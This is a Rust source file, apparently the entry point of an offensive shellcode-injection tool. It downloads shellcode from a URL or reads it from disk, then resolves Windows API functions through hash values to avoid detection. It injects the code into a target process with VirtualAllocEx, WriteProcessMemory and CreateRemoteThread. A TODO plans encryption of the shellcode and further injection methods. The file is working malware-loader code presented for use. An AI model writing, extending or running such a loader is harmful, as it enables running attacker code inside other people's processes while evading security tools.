#![allow(warnings)]
use std::collections::HashMap;
mod types;
mod utils;
mod helpers;
mod injection;
use std::env;

/*
TODO
1. Add other types of injections
2. Encrypt/Decrypt the shellcode
*/

fn main() {

    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("[!] Please provide location for the shellcode, either file path or URL and PID to inject");
        return;
    }
    let sc_location: String = args[1].clone();
    let pid_string: String = args[2].clone();
    let pid_to_inject = pid_string.parse::<u32>().expect("[!] Cant convert PID to int, check the value!");

    let mut shellcode: Vec<u8> = Vec::new();
    if sc_location.starts_with("http") {
        // Download from URL
        println!("[+] Downloading shellcode from: {}", sc_location);
        shellcode = utils::download_file(sc_location.as_str());
    } else {
        // Read the shellcode from a file on disk (for testing)
        println!("[+] Reading shellcode from a file: {}", sc_location);

        // The shellcode is read as a byte vector
        shellcode = match utils::read_file(sc_location.as_str()) {
            Some(sc) => sc,
            None => {
                return
            }
        };
    }

    // Define hashes for library and functions that will be used
    let lib_hash: u32 = 4247443901; //KERNEL32.DLL
    let api_hashes: HashMap<&str, u32> = HashMap::from([
        ("vae", 2908147326),  // VirtualAllocEx
        ("vpe", 3888478527),  // VirtualProtectEx
        ("wpm", 4252799543),  // WriteProcessMemory
        ("crt", 256709555),   // CreateRemoteThread
        ("op", 2936230014),   // OpenProcess
        ("ch", 2656327410),   // CloseHandle
    ]);

    // Get the addresses of all functions that will be used
    let apis: HashMap<&str, types::LPVOID> = utils::initAPIs(lib_hash, api_hashes);

    // Inject the shellcode
    injection::remote_inject(apis, shellcode, pid_to_inject as types::DWORD);
}